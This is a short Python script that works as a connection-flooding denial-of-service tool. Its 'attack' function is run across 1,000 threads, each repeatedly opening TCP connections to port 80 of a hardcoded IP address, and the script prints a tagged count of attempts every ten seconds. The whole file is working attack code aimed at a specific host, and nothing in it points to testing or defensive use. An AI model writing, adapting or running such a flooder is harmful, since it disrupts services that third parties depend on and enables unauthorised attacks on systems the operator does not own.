import socket
import threading
import time
import sys
import random

target_ip = "45.133.200.14"
target_port = 80

packet_count = 0
running = True

def attack():
    global packet_count
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect_ex((target_ip, target_port))
            sock.close()
            packet_count += 1
        except:
            pass

for _ in range(1000):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

last_count = 0
last_time = time.time()

try:
    while True:
        time.sleep(0.1)
        current_time = time.time()
        if current_time - last_time >= 10:
            current_count = packet_count
            sent_last_10s = current_count - last_count
            print(f"FAUST-{sent_last_10s}")
            last_count = current_count
            last_time = current_time
except KeyboardInterrupt:
    running = False
    sys.exit(0)
